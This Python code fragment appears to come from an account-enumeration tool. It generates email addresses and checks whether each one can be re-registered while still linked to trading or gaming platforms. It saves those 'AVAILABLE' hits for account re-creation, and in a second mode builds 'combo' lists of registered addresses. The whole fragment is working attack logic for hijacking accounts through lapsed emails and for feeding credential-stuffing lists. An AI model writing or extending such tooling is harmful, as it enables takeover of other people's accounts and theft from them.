        try:
            user = Generator.create_user(prefix, length)
            for dom in domains:
                email = f"{user}@{dom}"
                checked += 1
                
                # OPTION 01: Available & Linked (Re-create Mode)
                if mode == "1":
                    if Checkers.is_creatable(email, dom):
                        found_apps = Checkers.check_platforms(email)
                        if found_apps:
                            hits += 1
                            res = f" {hits} - AVAILABLE: {email} | Linked: {' + '.join(found_apps)}"
                            print(Fore.GREEN + res)
                            save_data(RECREATE_FILE, res)
                        else:
                            # Keep progress visible on one line
                            print(Fore.WHITE + f" [SCAN] {email} (No Platforms)", end="\r")
                    else:
                        bad += 1

                # OPTION 02: Combo Maker (Registered + Trading/Gaming)
                elif mode == "2":
                    found_apps = Checkers.check_platforms(email)
                    if found_apps:
                        hits += 1
                        # Save specifically to Gimlaamm.txt as requested
                        res = f"{email} | {' + '.join(found_apps)}"
                        print(Fore.CYAN + f" {hits} - HIT (COMBO): {res}")
                        save_data(HITS_FILE, res)
                    else:
                        bad += 1
                        print(Fore.YELLOW + f" [CHECK] {email}...", end="\r")
            
            time.sleep(0.01) # Optimized for OPPO A16k speed
        except: continue

